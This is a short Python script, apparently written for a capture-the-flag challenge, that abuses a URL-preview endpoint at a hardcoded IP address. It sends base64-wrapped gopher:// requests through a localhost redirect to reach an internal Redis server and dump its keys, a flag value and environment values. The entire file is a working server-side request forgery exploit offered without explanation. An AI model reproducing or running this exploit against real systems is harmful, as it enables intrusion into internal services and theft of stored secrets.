import base64, urllib.parse, urllib.request, json, sys
def b64(s): return base64.urlsafe_b64encode(s.encode()).decode().rstrip('=')
def redis(cmds):
    payload='\r\n'.join(cmds+['QUIT'])+'\r\n'
    g='gopher://redis:6379/_'+urllib.parse.quote(payload)
    u='http://23.239.30.114:8081/api/preview?url='+urllib.parse.quote('http://localhost:5000/l/'+b64(g))
    try:
        r=urllib.request.urlopen(u,timeout=15); d=json.load(r)
        return d.get('preview',d.get('error',''))
    except Exception as e:
        return 'ERR '+str(e)
print(redis(['KEYS *','GET flag_val','GET env_val']))
